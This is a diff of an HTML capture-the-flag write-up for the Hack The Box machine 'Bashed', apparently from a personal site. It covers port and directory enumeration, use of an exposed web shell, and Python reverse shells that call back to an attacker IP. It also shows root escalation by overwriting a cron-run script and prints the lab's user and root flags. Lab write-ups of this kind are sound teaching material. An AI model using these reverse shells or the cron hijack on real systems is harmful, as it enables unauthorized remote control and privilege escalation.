@@ -3,271 +3,258 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bashed</title>
+    <title>Bashed - Writeup</title>
     <style>
+        /* Global Reset */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 20px auto;
-            border: 1px solid #30363d;
-            border-radius: 4px;
-            }
-        
         body {
             background-color: #0d1117;
-            color: #79c0ff;
+            color: #c9d1d9;
             font-family: 'Courier New', monospace;
             line-height: 1.6;
             display: flex;
             flex-direction: column;
-            align-items: center; /* Centers the header/title */
-            padding: 20px;
+            align-items: center;
+            padding: 40px 20px;
         }
 
-        /* This is your main centered box */
+        /* Titles */
+        h1, h2, h3 { color: #79c0ff; text-align: center; margin-bottom: 10px; }
+        .step-header {
+            color: #ff7b72;
+            border-bottom: 1px solid #30363d;
+            margin: 40px 0 20px 0;
+            padding-bottom: 5px;
+            font-size: 1.4em;
+        }
+
+        /* Layout Container */
         .container {
-        display: flex; 
+            display: flex;
             justify-content: center;
-            align-items: flex-start; 
-            gap: 30px; /* Increased gap between main box and sidebar */
-            margin: 0 auto; 
-            padding: 30px 30px; /* Adds 40px padding to left and right */
-            max-width: 1200px; /* Prevents the whole layout from becoming too wide */
+            align-items: flex-start;
+            gap: 40px;
+            max-width: 1100px;
             width: 100%;
+            margin-top: 30px;
         }
 
         .main-content {
-        background-color: #0d1117;
+            background-color: #161b22;
             border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 30px;
-            /* Removed flex-shrink: 0 to allow responsiveness */
-            max-width: 700px; /* Reduced from 800px as requested */
-            width: 100%;
-
-            
+            border-radius: 8px;
+            padding: 40px;
+            flex: 1;
+            max-width: 800px;
         }
 
-        .terminal-box {
-            display: block; /* Changed from inline-block to block to prevent side-by-side issues */
-            background-color: #000000; 
-            color: #00FF00; 
-            padding: 15px; 
-            border-radius: 8px; 
-            font-family: 'Courier New', Courier, monospace;
-            border: 1px solid #333;
-            margin: 20px 0;
-            overflow-x: auto; /* Adds a scrollbar if the code line is too long */
-        }
-
-        h1, h2, h3 {
-            color: #79c0ff;
-            text-align: center; /* Centers your titles */
-            width: 100%;
-        }
-
-        p {
-            margin: 15px 0;
-            color: #8b949e;
-        }
-
-        a { color: #58a6ff; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-
-        .sticky-element {
-            /* Keeps everything centered in the sticky note */
-            text-align: center;
-            position : sticky;
-            top: 20px;
-            padding: 15px;
-            }
-        
+        /* Sidebar & Sticky Nav */
         .sidebar {
-        flex: 0 1 250px; /* Grow: 0, Shrink: 1, Ideal width: 250px */
+            flex: 0 0 150px;
+            align-self: stretch;
+        }
+
+        .sticky-nav {
             position: sticky;
-            top: 20px;
-        }       
-        
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .nav-btn {
+            background-color: #21262d;
+            border: 1px solid #30363d;
+            color: #58a6ff;
+            padding: 12px;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+
+        .nav-btn:hover {
+            background-color: #30363d;
+            border-color: #8b949e;
+            color: #79c0ff;
+        }
+
+        /* Terminal & Code */
+        .terminal-box {
+            background-color: #000000;
+            color: #39ff14; /* Matrix Green */
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+            margin: 15px 0;
+            font-size: 0.9em;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+
+        /* Flags & Lists */
+        fieldset {
+            border: 1px solid #3fb950;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            background: rgba(63, 185, 80, 0.05);
+        }
+        legend { color: #3fb950; padding: 0 10px; font-weight: bold; }
+
+        ul { margin-left: 25px; margin-bottom: 15px; }
+        li { margin-bottom: 8px; color: #8b949e; }
+
+        img {
+            max-width: 100%;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+            margin: 20px 0;
+        }
+
+	/* Container for the terminal and button */
+.terminal-wrapper {
+    position: relative;
+    margin: 20px 0;
+}
+
+/* Style for the Copy Button */
+.copy-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    background: rgba(121, 192, 255, 0.1);
+    border: 1px solid #30363d;
+    color: #79c0ff;
+    padding: 5px 10px;
+    font-size: 12px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: sans-serif;
+    transition: all 0.2s;
+}
+
+.copy-btn:hover {
+    background: #79c0ff;
+    color: #0d1117;
+}
+
+/* Ensure the terminal box doesn't overlap the button */
+.terminal-box {
+    margin: 0 !important; /* Managed by wrapper now */
+    padding-right: 60px; /* Room for the button */
+}
     </style>
 </head>
 <body>
-<h1>Hack The Box</h1>
-<h2>Bashed</h2>
-<img src="/pngs/HTB/Easy/Alert/Alert.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Alert.png" style="border: none;">
-<h3>Easy</h3>
 
-<div class="container">
-    <div class="main-content">
-        <p>I started with port enumeration.</p>
+    <h1>Hack The Box</h1>
+    <h2>Bashed</h2>
+    <img src="/pngs/HTB/Easy/Alert/Alert.png" alt="Bashed Banner" style="border:none; width: 300px;">
+    <h3>Level: Easy</h3>
 
-<div class="terminal-box">
-    sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n  10.10.10.68
-  </div>
+    <div class="container">
+        <div class="main-content">
+            
+            <h3 class="step-header">1. Enumeration</h3>
+            <p>I started with a full port scan using Nmap:</p>
+            <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.10.68</div>
+            
+            <ul>
+                <li><strong>-p- --open</strong>: Scans all 65535 ports, showing only open ones.</li>
+                <li><strong>-sS</strong>: Stealth SYN scan.</li>
+                <li><strong>-Pn -n</strong>: Skips host discovery and DNS resolution for speed.</li>
+            </ul>
 
-<br>
-<ul>
-    <li>" -p- --open " : scans all ports and shows which ones are open</li>
-    <li>" -sS " : SYN scan.</li>
-    <li>" --min-rate 5000 " : specifies how many packets should be sent simultaneously.</li>
-    <li>" -vvv " : increases the verbosity of the scan , displays more detailed information.</li>
-    <br>
-    To have a clear view of the SYN scan we add : <br>
-    <li>" -Pn " : disables ICMP Echo request.</li>
-    <li>" -n " : disables DNS resolution</li>
-</ul>
+            <p>Only port 80 was open. Detailed service scan:</p>
+            <div class="terminal-box">nmap -sC -sV -p80 10.10.10.68</div>
 
-<br><br>
+            <p>I added <code>bashed.htb</code> to my hosts file and ran Gobuster:</p>
+            <div class="terminal-box">gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt</div>
+            
+            <p>Discovered <code>/dev/phpbash.php</code>—a web shell. Navigated there and found the user flag.</p>
 
-I found only port 80 open and enumerated it. <br><br>
+            <fieldset>
+                <legend>User Flag</legend>
+                <code>9b5f9adaa7f8ee097b68bd599e31d1ce</code>
+            </fieldset>
 
-<div class="terminal-box">
-nmap -sC -sV -p80 10.10.10.68
-</div> <br>
-<ul>
-    <li>" -sC " : executes default scripts</li>
-    <li>" -sV " : scans for service detection.</li>
-</ul><br>
-There I found that the domain name was "bashed.htb". Next I had to configure the "/etc/hosts" file.
-<br>
-<div class="terminal-box">
-<xmp>
-sudo tee -a /etc/hosts > /dev/null <<EOT
+            <h3 class="step-header">2. Privilege Escalation</h3>
+            <p>To get a proper shell, I started a listener on my machine:</p>
+            <div class="terminal-box">nc -lvnp 1234</div>
 
-## bashed host
-10.10.10.68 bashed.htb
-EOT
-</xmp>
-</div>
+            <p>Executed a Python reverse shell from the web UI:</p>
+            <div class="terminal-box">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.17",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div>
 
-I started directory enumeration where I found the "/dev" directory.
-<div class="terminal-box">
-    gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt</div>
-<br><br>
+            <p>Checking sudo permissions:</p>
+            <div class="terminal-box">sudo -l</div>
+            <p>We can run commands as <b>scriptmanager</b> without a password. Switching users:</p>
+            <div class="terminal-box">sudo -i -u scriptmanager</div>
 
-There I found and visited the "phpbash.php" file with a web shell running<br><br>
+            <p>Inside <code>/scripts</code>, I found <code>test.py</code> which is executed by root. I replaced it with a root reverse shell script:</p>
+            <div class="terminal-box">
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.17",9002))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty; pty.spawn("sh")</div>
 
-"http://10.10.10.68/dev/phpbash.php"<br>
-<br>
-At arrexel's home directory we find the user's flag. <br>
-<fieldset style="width: fit-content;">
-    <legend>User Flag</legend>
-    9b5f9adaa7f8ee097b68bd599e31d1ce
-</fieldset>
-<br>
-<br>---------------------------------------------------------------------<br>
-Privillege escalation.
-<br>---------------------------------------------------------------------<br>
+            <p>After a minute, the cronjob executed the script and granted root access.</p>
 
-First we try to obtain a reverse shell instead of the web shell.
-<br>
-From my machine I open a listener : 
-<div class="terminal-box">
-nc -lvnp 1234</div>
-<br>
-From the web shell I run the command : 
-<br>
-<div class="terminal-box">
-<xmp>
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.17",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</xmp>
-</div>
-<br>
-Upgrading the reverse shell with these steps :
-<br>
-<div class="terminal-box">
-    <xmp>
- python -c 'import pty; pty.spawn("/bin/bash")'
-    </xmp>
+            <fieldset>
+                <legend>Root Flag</legend>
+                <code>318b1a2f4579d0e8161424267a74eb62</code>
+            </fieldset>
+        </div>
+
+        <aside class="sidebar">
+            <nav class="sticky-nav">
+                <a href="/index.html" class="nav-btn">Home</a>
+                <a href="/machines.html" class="nav-btn">Machines</a>
+            </nav>
+        </aside>
     </div>
-<br>
 
-If we try the command "sudo -l" we find that we can run commands as "scriptmanager" with no password.
-<br>
-Next step is to check the directories. We find "/scripts". 
-<br>
-I tried to navigate there but I didn't have permissions.<br>
-I tried to change user to become "scriptmanager" by using "sudo"<br>
-<div class="terminal-box">
-    <xmp>
-sudo -i -u scriptmanager
-    </xmp>
-    </div>
-<br>
+    <!-- Copy button for terminal boxes function -->
+ <script>
+    document.querySelectorAll('.terminal-box').forEach((box) => {
+    // 1. Create a wrapper
+    const wrapper = document.createElement('div');
+    wrapper.className = 'terminal-wrapper';
+    box.parentNode.insertBefore(wrapper, box);
+    wrapper.appendChild(box);
 
-Now we can see that there are two files : <br>
-<ul>
-    <li>test.py</li>
-    <li>test.txt</li>
-</ul><br>
-We can see that the test.txt was modified recently. <br>
-If we read the test.py file we can see that this is a script running through root.<br>
-So we modify it to get a reverse shell as root.<br>
-I created a file to my machine named tets.py and this was it's content.<br>     
-    <div class="terminal-box">
-        test.py<br>
-    <xmp>
-        import socket,subprocess,os
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(("10.10.14.17",9002))
-        os.dup2(s.fileno(),0)
-        os.dup2(s.fileno(),1)
-        os.dup2(s.fileno(),2)
-        import pty
-        pty.spawn("sh")
-</xmp>
-</div>
-<br>
-I opened a new listener to port 9002 and I opened an http server.<br>
-<br>
-<div class="terminal-box">
-    <xmp>
-python3 -m http.server 8000
-    </xmp>
-    </div>
-<br>
+    // 2. Create the button
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.innerText = 'Copy';
 
-From the reverse shell I downloaded the new "test.py"
+    // 3. Add copy functionality
+    btn.addEventListener('click', () => {
+        const text = box.innerText;
+        navigator.clipboard.writeText(text).then(() => {
+            btn.innerText = 'Copied!';
+            btn.style.borderColor = '#3fb950'; // Green success border
 
-<br>
-<div class="terminal-box">
-    <xmp>
-wget http://10.10.14.17:8000/test.py -O /scripts/test.py    </xmp>
-    </div>
-<br>
-And I changed permissions to be accessible from everyone.
-<br>
-<div class="terminal-box">
-    chmod 777 test.py
-</div>
-<br>
+            // Reset button after 2 seconds
+            setTimeout(() => {
+                btn.innerText = 'Copy';
+                btn.style.borderColor = '#30363d';
+            }, 2000);
+        });
+    });
 
-Back to our listener we can see that after a minute we have our shell as root.
-
-<img src=![[Pasted image 20250423145542.png]]> <br><br>
-
-<fieldset style="width: fit-content;">
-    <legend>Root Flag</legend>
-    318b1a2f4579d0e8161424267a74eb62
-</fieldset>
-<br>
-
-</div>
-<aside class="sidebar">
-    <div class="sticky-element">
-        <a href="/index.html"><h3>Home</h3></a>
-        <a href="/machines.html"><h3>Machines</h3></a>
-    </div>
-</aside>
-  
-</div>
-  
+    wrapper.appendChild(btn);
+});
+ </script>
 </body>
-  
 </html>
